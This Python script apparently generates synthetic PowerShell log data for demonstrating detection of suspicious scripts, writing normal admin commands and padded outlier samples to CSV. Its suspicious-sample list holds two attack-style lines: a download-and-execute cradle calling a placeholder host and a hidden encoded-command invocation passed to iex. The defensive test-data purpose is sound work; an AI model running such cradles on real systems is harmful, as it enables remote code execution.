"""Generate synthetic PowerShell log data for public demonstration.

The generated data approximates the behavioral pattern from the original project:
normal administrative scripts cluster near a predictable length/whitespace
relationship, while suspicious scripts are longer and denser.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

import pandas as pd

from .config import (
    DEFAULT_INPUT_FILE,
    DEFAULT_OUTLIER_COUNT,
    DEFAULT_SAMPLE_SIZE,
    RANDOM_SEED,
)


NORMAL_SNIPPETS = [
    "Get-Process | Where-Object { $_.CPU -gt 100 }",
    "Get-Service | Where-Object { $_.Status -eq 'Running' }",
    "Invoke-Sqlcmd -Query 'SELECT COUNT(*) FROM dbo.TableA'",
    "Get-EventLog -LogName Application -Newest 50",
    "Restart-Service -Name MSSQLSERVER -Force",
    "Get-ChildItem C:\\Temp | Where-Object { $_.Length -gt 1000 }",
]

SUSPICIOUS_SNIPPETS = [
    "IEX(New-ObjectNet.WebClient).DownloadString('http://x/p');$a='A'*900;$b=$a+$a+$a;Invoke-Expression$b",
    "$x='powershell -nop -w hidden -enc AAAABBBBCCCCDDDDEEEEFFFF';$y=$x.Replace(' ','');iex$y",
]


def _make_normal_script() -> str:
    line_count = random.randint(1, 5)
    lines = random.choices(NORMAL_SNIPPETS, k=line_count)
    return "\n".join(lines)


def _make_suspicious_script() -> str:
    base = random.choice(SUSPICIOUS_SNIPPETS)
    padding = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=random.randint(400, 900)))
    return base + padding


def generate_sample_data(
    output_file: Path = DEFAULT_INPUT_FILE,
    sample_size: int = DEFAULT_SAMPLE_SIZE,
    outlier_count: int = DEFAULT_OUTLIER_COUNT,
    seed: int = RANDOM_SEED,
) -> pd.DataFrame:
    """Generate synthetic PowerShell logs and write them to CSV."""
    random.seed(seed)
    output_file.parent.mkdir(parents=True, exist_ok=True)

    start_time = datetime(2026, 1, 1, 0, 0, 0)
    rows = []

    normal_count = max(sample_size - outlier_count, 0)

    for i in range(normal_count):
        rows.append(
            {
                "timestamp": start_time + timedelta(seconds=i * 10),
                "hostname": f"SQLSERVER{random.randint(1, 50):02d}",
                "script_text": _make_normal_script(),
                "synthetic_label": "normal",
            }
        )

    for i in range(outlier_count):
        rows.append(
            {
                "timestamp": start_time + timedelta(seconds=(normal_count + i) * 10),
                "hostname": f"SQLSERVER{random.randint(1, 50):02d}",
                "script_text": _make_suspicious_script(),
                "synthetic_label": "outlier_example",
            }
        )

    random.shuffle(rows)
    df = pd.DataFrame(rows)
    df.to_csv(output_file, index=False)
    return df


if __name__ == "__main__":
    generated = generate_sample_data()
    print(f"Generated {len(generated)} sample PowerShell log rows at {DEFAULT_INPUT_FILE}")
